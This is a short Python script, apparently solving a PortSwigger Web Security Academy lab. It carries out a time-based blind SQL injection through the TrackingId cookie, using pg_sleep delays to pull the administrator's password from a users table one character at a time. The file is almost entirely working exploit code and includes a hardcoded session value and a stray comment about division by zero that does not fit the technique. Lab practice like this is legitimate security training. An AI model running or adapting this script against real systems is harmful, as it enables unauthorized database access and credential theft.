import requests
import time

session = "Lu9UpsHor6s1yJAMlJL86WDtALPCNWir"

possiblePass = "qwertyuiopasdfghjklzxcvbnm1234567890"

password = ""
for i in range(1,21):
    for p in possiblePass:

        start_time = time.time()

        headers = {"Cookie": "TrackingId=wD1NfH6coscNSbjs'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password, " + str(i) + ", 1) = '" + p + "')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--",
                "session": session
                }
        body = None

        # Extract headers and body from the request text
        # Send the HTTP request
        response = requests.request("get","https://0ac900c803513a9c80bb35ca003200e3.web-security-academy.net/login" , headers=headers)

        end_time = time.time()
        execution_time = end_time - start_time

        if execution_time > 4.5:
            print(p)
            password += p

        #status code 500 means that the server tried to calculate 1 divided by 0

print(password)